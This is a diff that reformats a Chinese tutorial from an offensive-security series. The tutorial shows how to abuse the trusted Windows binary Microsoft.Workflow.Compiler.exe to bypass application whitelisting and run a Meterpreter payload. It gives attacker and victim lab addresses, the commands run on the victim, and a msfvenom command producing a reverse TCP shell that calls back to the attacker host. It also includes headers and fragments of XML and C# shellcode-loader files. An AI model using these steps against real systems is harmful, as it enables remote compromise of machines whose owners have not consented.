@@ -1,6 +1,3 @@
-# 专注APT攻击与防御
-https://micropoor.blogspot.com/
-
 **注：**请多喝点热水或者凉白开，身体特别重要。
 
 **说明：**Microsoft.Workflow.Compiler.exe所在路径没有被系统添加PATH环境变量中，因此，Microsoft.Workflow.Compiler命令无法识别。
@@ -8,38 +5,47 @@ https://micropoor.blogspot.com/
 基于白名单Microsoft.Workflow.Compiler.exe配置payload：
 
 Windows 7 默认位置：
-`C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe`
+```bash
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe
+```
 
-**攻击机：**192.168.1.4 Debian
+**攻击机：**192.168.1.4 Debian  
 **靶机：**192.168.1.3 Windows 7
 
-**配置攻击机msf：**
+### 配置攻击机msf：
 ![](media/47453f0e7a3b60f14589ea8f102ea82d.jpg)
 
-**靶机执行：**
-`C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe poc.xml Micropoor.tcp`
+### 靶机执行：
+```bash
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe poc.xml Micropoor.tcp
+```
 
-![](media/40c67a6cba66cafda51b2c0e4f60324e.jpg)
+![](media/40c67a6cba66cafda51b2c0e4f60324e.jpg)  
+
 ![](media/e9cdf8ac5b498f1251f1b7cdb66d7df5.jpg)
 
 
-**结合meterpreter：**
+### 结合meterpreter： 
 **注：payload.cs需要用到System.Workflow.Activities**
 
 **靶机执行：**
-`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe poc.xml Micropoor_rev1.cs`
+```bash
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe poc.xml Micropoor_rev1.cs
+```
 
-**配置攻击机msf：**
+**配置攻击机msf：**  
 ![](media/fbf3bad26108f56a22bd8c15744731aa.jpg)
 
-**payload生成：**
-`msfvenom ‐p windows/x64/shell/reverse_tcp LHOST=192.168.1.4 LPORT=53 ‐ f csharp`
+**payload生成：**  
+```bash
+msfvenom ‐p windows/x64/shell/reverse_tcp LHOST=192.168.1.4 LPORT=53 ‐ f csharp
+```
 ![](media/a66c514584809a6a9cb7a751c04dd23a.jpg)
 
-## 附录：poc.xml
+### 附录：poc.xml
 **注：windows/shell/reverse_tcp**
-```
+```xml
 <?xml version="1.0" encoding="utf‐8"?>
 
 <CompilerInput xmlns:i="http://www.w3.org/2001/XMLSchema‐instance" xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler"
@@ -220,7 +226,7 @@ catch (Exception err) { }
 }
 ```
 
-**Micropoor_rev1.cs：**
+### Micropoor_rev1.cs：
 
 **注：x64 payload**
 
@@ -335,3 +341,5 @@ WaitForSingleObject(oXmoNUYvivZlXj, 0xFFFFFFFF);}
 
 }
 ```
+
+> Micropoor
